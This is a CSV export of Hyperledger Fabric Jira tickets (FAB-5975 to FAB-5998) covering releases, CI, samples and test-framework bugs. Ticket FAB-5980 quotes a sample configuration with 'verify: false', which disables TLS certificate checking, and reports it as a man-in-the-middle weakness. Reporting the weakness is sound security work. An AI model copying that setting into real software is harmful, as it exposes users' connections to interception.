AM;denyeart;https://gerrit.hyperledger.org/r/#/c/13041/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
behave test fmwk fails to bring up a kafka network when all peers are org-leaders,FAB-5975,20530,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,latitiah,Nishi,Nishi,31/Aug/17 12:17 AM,30/Jul/19 10:11 AM,28/Oct/23 3:00 AM,30/Jul/19 10:11 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"In the attached docker-compose set all peers with following attributes.

- CORE_PEER_GOSSIP_ORGLEADER=true
 - CORE_PEER_GOSSIP_USELEADERELECTION=false

 

When I run attached feature file - it fails to bring up a kafka network.

A solo network when all peers were leaders was run successfully.

 

fabric commit level *297d393b75868b11f75272d91ff5234b0fcfb4fa*

fabric-test commit level: *4bdb7ceb86bbd2953f212d13f4ae8491af32b8dd*",,jyellick,Nishi,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 12:19 AM;Nishi;101.feature;https://jira.hyperledger.org/secure/attachment/11994/101.feature","31/Aug/17 12:17 AM;Nishi;docker-compose-kafka.yml;https://jira.hyperledger.org/secure/attachment/11993/docker-compose-kafka.yml",,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeuv:",,,,,,,,,,,,,,,,,,,,,,,jyellick,Nishi,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/May/18 2:17 AM;jyellick;As we seem to be moving away from behave, is this still valid? [~scottz];;;","09/May/18 12:40 AM;scottz;We are not deprecating the behave framework in fabric-test repo any time soon.

The gossip.feature file has tests similar to this; we could add a test there to bring up a network with every peer being a leader, to see if it is currently working. If broken, then we should triage to be sure it is not a fabric bug - and if not then we can reconsider if it really is due to missing or broken functionality in the test framework.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Writing Your First App cleanup/add new low level doc on WYFA,FAB-5976,20531,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,joe-alewine,joe-alewine,31/Aug/17 12:28 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,27/Oct/17 11:57 PM,,,,,,fabric-docs,,,,,,0,,,,,,,"Following comments by Nick Gaski and Anthony O'Dowd, it's necessary to improve/edit the writing your first app document by including certain incremental changes/cleanup. As well as by creating a new doc – that won't appear in the table of contents – that explains at a low level what's going on in an app (how it connects to a network, how queries and updates are constructed, etc).",,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyev3:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make channel service listener sample work with TLS enabled,FAB-5977,20533,20082,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,31/Aug/17 2:57 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Dec/17 1:05 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyevb:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 10:38 PM;wlahti;https://gerrit.hyperledger.org/r/#/c/13001/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add protolator support for new capabilities message,FAB-5978,20534,19633,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,31/Aug/17 3:49 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,19/Sep/17 9:50 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyevj:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configurare CI jobs for fabric-sdk-rest project,FAB-5979,20535,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,31/Aug/17 5:45 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 9:54 PM,,,,,,fabric-ci,,,,,,0,fabric-ci,,,,,,Configure CI jobs (verify and merge) jobs for fabric-sdk-rest project.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyevr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:54 PM;rameshthoomu;Configured *verify* and *merge* jobs runs on any branch based on the request come in.. https://jenkins.hyperledger.org/view/fabric-sdk-rest/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fully secure TLS connection not demonstrated in balance-transfer example in fabric-samples,FAB-5980,20536,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,skarim,vdods,vdods,31/Aug/17 9:57 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,08/Jun/18 10:42 PM,v1.0.5,v1.1.0,,WON'T FIX,,fabric-samples,,,,,,0,,,,,,,"In the balance-transfer example, the TLS connection to the CA from the client does not perform certificate validation.

In typescript/artifacts/network-config.yaml, the verify option in 'httpOptions' is set to false:

{code:none}
certificateAuthorities:
  ca-org1:
    url: https://localhost:7054
    # the properties specified under this object are passed to the 'http' client verbatim when
    # making the request to the Fabric-CA server
    httpOptions:
      verify: false
    tlsCACerts:
      path: artifacts/channel/crypto-config/peerOrganizations/org1.example.com/ca/ca.org1.example.com-cert.pe
{code}

This will not verify that the TLS server's cert is signed by a trusted CA (ostensibly those specified by trustedRoots). More documentation on the feature and a working demonstration is necessary.

As it stands, while TLS encryption is enabled, it is susceptible to man-in-the-middle attacks, and therefore is a security vulnerability.  Showing, via examples and documentation, correct and secure operation of Fabric is necessary for users to make robust applications, and that's why this is filed as a bug.",,denyeart,jyellick,kchristidis,mastersingh24,skarim,vdods,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8377,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyevz:",,,,,,,,,,,,,,,,,,,,,,,denyeart,jyellick,kchristidis,mastersingh24,skarim,vdods,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 10:01 AM;vdods;Here's a useful link:

[https://stackoverflow.com/questions/31861109/tls-what-exactly-does-rejectunauthorized-mean-for-me]

 ;;;","09/Dec/17 10:15 PM;mastersingh24;[~vdods] - The tricky part here is that the CAs, peers and orderer are all running in Docker containers and the balance transfer app is running locally on the host. The common names set in the TLS server certs for all of these containers match the container_ids set via docker-compose.yaml. But the host machine will not be able to resolve these DNS names and therefore the app uses ""localhost"" as the address for all of the containers (ports are exposed on the host in docker-compose.yaml). But then the issue is that the CN in the certificate will not match the hostname(s) the client / app uses to communicate with the container(s) and the connection will fail.

The sample uses the *ssl-target-name-override* property for the gRPC settings ( [https://github.com/hyperledger/fabric-samples/blob/release/balance-transfer/app/helper.js#L65] ) to overcome this for communicating with the peer / orderer nodes. For the the connection to the CA, as you noted the sample used rejectUnauthorized. We can emulate the behavior of the gRPC connections by using the *checkServerIdentity(servername, cert)* option instead.

Of course the other option would be to add *localhost* to the *SANs* defined in the certificates we generate as well;;;","10/Dec/17 3:54 PM;vdods;That issue is dealt with easily by running the balance transfer app also in a docker container.;;;","15/Feb/18 1:57 AM;denyeart;[~aambati] Can you take a look and provide an opinion?;;;","21/Feb/18 11:42 PM;mastersingh24;I'd suggest that when we generate the crypto artifacts we specify ""localhost"" as one of the SANs.  There is an option to do this when running cryptogen;;;","08/Mar/18 4:40 AM;skarim;I am trying to add ""localhost"" as one of the SANs for the CA certificates but cryptogen does not seem to be picking it up. 

In my cryptogen.yaml file I have a section like:

{code:none}
  - Name: Org2
    Domain: org2.example.com
    CA:
       Hostname: ca # implicitly ca.org1.example.com
       SANS:
        - ""localhost""

    Template:
      Count: 2
      SANS:
        - ""localhost""
    Users:
      Count: 1
{code}

But when I look at the ca certificate that is generated, it does not contain SANs. [~mastersingh24] [~adc]
;;;","05/May/18 2:18 AM;jyellick;Any updates here?;;;","22/May/18 3:17 AM;kchristidis;^^ Please update status.

FWIW, experimenting with cryptogen and setting SANS to ""127.0.0.1"" seems to work w/o issues.;;;","22/May/18 9:35 AM;skarim;[~jyellick] I have not had much time to look into this further. [~kchristidis], can you post your cryptogen.yaml file? Maybe I wasn't configuring it correctly;;;","22/May/18 9:46 AM;kchristidis;[~skarim]: https://gerrit.hyperledger.org/r/c/19743/17/integration/orderer/raft/testdata/cryptogen.yml;;;","08/Jun/18 10:39 PM;mastersingh24;I honestly would not waste time on this.  It's a sample .... not a reference.

[~kchristidis] [~skarim] - I personally think this should be closed as WON'T FIX;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
syntax error in sampleconfig,FAB-5981,20537,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,TopJohn,TopJohn,TopJohn,31/Aug/17 10:15 AM,21/Jul/18 3:49 AM,28/Oct/23 3:00 AM,17/May/18 6:42 AM,,,,,,,,,,,,0,,,,,,,There is a syntax error in the order.yaml of sampleconfig package.,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyew7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
run unit-test in verbose mode,FAB-5985,20541,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,n-horiguchi,n-horiguchi,n-horiguchi,31/Aug/17 1:12 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Feb/18 6:03 AM,v1.0.0,,,v1.1.0,,,,,,,,0,,,,,,,"unit-test/ is helpful not only for verifying, but also for debugging. So switching verbose mode from callers is helpful.",,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,3600,3600,,0%,3600,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyex3:",,,,,,,,,,,,,,,,,,,,,,,n-horiguchi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Sep/17 8:22 AM;n-horiguchi;The patch is available in https://gerrit.hyperledger.org/r/#/c/13023/

Thanks,
Naoya Horiguchi;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Syntax error in sampleconfig,FAB-5986,20542,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,TopJohn,TopJohn,TopJohn,31/Aug/17 3:46 PM,21/Jul/18 3:47 AM,28/Oct/23 3:00 AM,17/May/18 6:43 AM,,,,,,,,,,,,0,,,,,,,"Syntax error in sampleconfig:

core.yaml Line 82 ,this will make ambiguity to others.",,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyexb:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cut v1.0.2 release,FAB-5987,20543,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 4:41 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,v1.0.2,,fabric-release,,,,,31/Aug/17 12:00 AM,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6371,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyexj:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Set fix version to v1.0.2 for fabric bugs to be included in 1.0.2 release,FAB-5988,20544,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 4:43 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 4:43 PM,,,,v1.0.2,,fabric-release,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyexr:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 4:43 PM;mastersingh24;Fabric:   https://jira.hyperledger.org/issues/?filter=10823
Fabric CA:  https://jira.hyperledger.org/issues/?filter=10824;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release Hyperledger Fabric v1.0.2,FAB-5989,20545,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 4:46 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:29 PM,,,,v1.0.2,,fabric-release,,,,,,0,,,,,,,"MUST BE REBASED JUST BEFORE MERGING
Check for clean CI passes
Update Makefile
BASE_VERSION = 1.0.2
PREV_VERSION = 1.0.1
IS_RELEASE = true
release_notes/v1.0.2.txt should be updated
docs/source/releases.rst should be updated with prose and link to GH release page
change log should be generated just after rebasing to pick up the last minute merged CRs and linked from docs/source/releases.rst",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyexz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Aug/17 5:27 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/13031/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Release Hyperledger Fabric CA v1.0.2,FAB-5990,20546,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 4:50 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,v1.0.2,,fabric-release,,,,,,0,,,,,,,"MUST BE REBASED JUST BEFORE MERGING
Check for clean CI passes
Update Makefile
BASE_VERSION = 1.0.2
PREV_VERSION = 1.0.1
IS_RELEASE = true
change log should be generated just after rebasing to pick up the last minute merged CRs 
update release_notes/v1.0.2.txt",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyey7:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 5:28 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/13035/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update fabric samples docs with new short URL for release,FAB-5991,20547,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 4:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,v1.0.2,,fabric-docs,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeyf:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
There are some  errors in the fabric-samples/first-network/,FAB-5992,20548,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,TopJohn,TopJohn,31/Aug/17 4:54 PM,23/Jan/20 7:04 AM,28/Oct/23 3:00 AM,23/Jan/20 7:04 AM,,,,,,fabric-samples,,,,,,0,stale-item,,,,,,"The script.sh has some repeated areas and syntax error.

 ",,sykesm,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyeyn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,sykesm,TopJohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jan/20 7:04 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric for v1.0.3 release,FAB-5993,20549,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 5:11 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,,,fabric-release,,,,,,0,,,,,,,"Bump version to 1.0.3
Previous version to 1.0.2
is_release = false",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5994,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyeyv:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,release-1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Aug/17 5:29 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/13033/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepare fabric-ca for v1.0.3 release,FAB-5994,20550,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 5:15 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,,,fabric-release,,,,,,0,,,,,,,"Bump version to 1.0.3
Previous version to 1.0.2
is_release = false",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5993,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyez3:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 5:28 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/13037/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update samples to work with v1.0.2 release,FAB-5995,20551,20543,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,31/Aug/17 5:32 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,04/Sep/17 6:30 PM,,,,v1.0.2,,fabric-samples,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyezb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Aug/17 6:08 PM;mastersingh24;first-network -  works with fabric-samples master

basic-network - update docker-compose.yaml to v1.0.2 images and regenerate prebuilt artifacts using the v1.0.2 tools

fabcar - works after updating basic-network

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-sdk-rest CI merge jobs are failing,FAB-5996,20552,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,31/Aug/17 9:47 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 3:38 AM,,,,,,fabric-ci,,,,,,0,fabric-ci,,,,,,Observed fabric-sdk-rest CI merge is failing.. Seems some configuration mismatch in merge job builder script.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyezj:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Aug/17 9:52 PM;rameshthoomu;Patch has been submitted.. https://gerrit.hyperledger.org/r/#/c/13043/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cleanup transientstore related code from ledger,FAB-5997,20555,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,31/Aug/17 10:28 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,07/Sep/17 2:36 AM,,,,v1.1.0,,fabric-ledger,,,,,,0,,,,,,,"As the transientstore, coordinator and peers are integrated, ledger no longer use transient store directly to fetch private data. transientstore related code in ledger can be removed.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyezz:",,,,,,,,,,,,,,,,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE in network launcher ,FAB-5998,20558,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,31/Aug/17 10:54 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,01/Sep/17 12:37 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,update CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE setting to nl_default,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyf0n:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/